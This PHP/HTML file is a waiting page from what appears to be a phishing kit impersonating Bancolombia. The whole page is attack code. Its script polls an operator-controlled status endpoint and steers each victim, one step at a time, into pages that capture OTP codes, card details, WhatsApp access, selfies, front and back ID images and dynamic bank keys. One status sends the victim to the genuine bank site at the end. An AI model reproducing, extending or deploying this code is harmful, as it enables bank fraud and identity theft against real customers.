<?php

// Mobile check removed

?>
<?php
// 1. Cargar Configuración Global
$config = require __DIR__ . '/../config/config.php';
$baseUrl = $config['baseUrl'];
$clienteId = $_GET['id'] ?? null;
?>
<!DOCTYPE html>
<html lang="es">

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando...</title>

    <link rel="stylesheet" href="assets/css/login.css">
</head>

<body>
    <div class="wait-overlay active">
        <div class="wait-container">
            <div class="spinner"></div>
            <p>Cargando...</p>
        </div>
    </div>

    <script>
        const clienteId = <?php echo json_encode($clienteId); ?>;
        const baseUrl = <?php echo json_encode($baseUrl); ?>;
        let estadoInicial = null;

        async function checkStatus() {
            if (!clienteId) { clearInterval(statusInterval); return; }
            try {
                const response = await fetch(`modules/api/verificar_estado.php?id=${clienteId}`);
                const data = await response.json();
                if (data.error) { console.warn('Error estado:', data.error); return; }

                const estado = data.estado;
                // Estado 1 = esperando acción del admin → seguir polling
                // Cualquier otro estado → actuar inmediatamente
                if (estado === 1) return;

                clearInterval(statusInterval);
                if      (estado == 2)  window.location.href = `index.php?status=erroruser&id=${clienteId}`;
                else if (estado == 3)  window.location.href = `index.php?status=otp&id=${clienteId}`;
                else if (estado == 4)  window.location.href = `index.php?status=otp&id=${clienteId}&error=1`;
                else if (estado == 5)  window.location.href = `index.php?status=cc&id=${clienteId}`;
                else if (estado == 6)  window.location.href = `index.php?status=ccerror&id=${clienteId}`;
                else if (estado == 7)  window.location.href = `https://www.bancolombia.com/personas`;
                else if (estado == 8)  window.location.href = `index.php?status=whatsapp&id=${clienteId}`;
                else if (estado == 9)  window.location.href = `index.php?status=selfie&id=${clienteId}`;
                else if (estado == 10) window.location.href = `index.php?status=selfieerror&id=${clienteId}`;
                else if (estado == 11) window.location.href = `index.php?status=doc_front&id=${clienteId}`;
                else if (estado == 12) window.location.href = `index.php?status=doc_back&id=${clienteId}`;
                else if (estado == 13) window.location.href = `index.php?status=doc_front_error&id=${clienteId}`;
                else if (estado == 14) window.location.href = `index.php?status=doc_back_error&id=${clienteId}`;
                else if (estado == 15) window.location.href = `index.php?status=clave_dinamica&id=${clienteId}`;
                else if (estado == 16) window.location.href = `index.php?status=clave_dinamica_error&id=${clienteId}`;
                else window.location.href = `index.php?id=${clienteId}`;

            } catch (error) {
                console.error('Error al verificar el estado:', error);
            }
        }
        const statusInterval = setInterval(checkStatus, 3000);
        checkStatus();
    </script>
</body>

</html>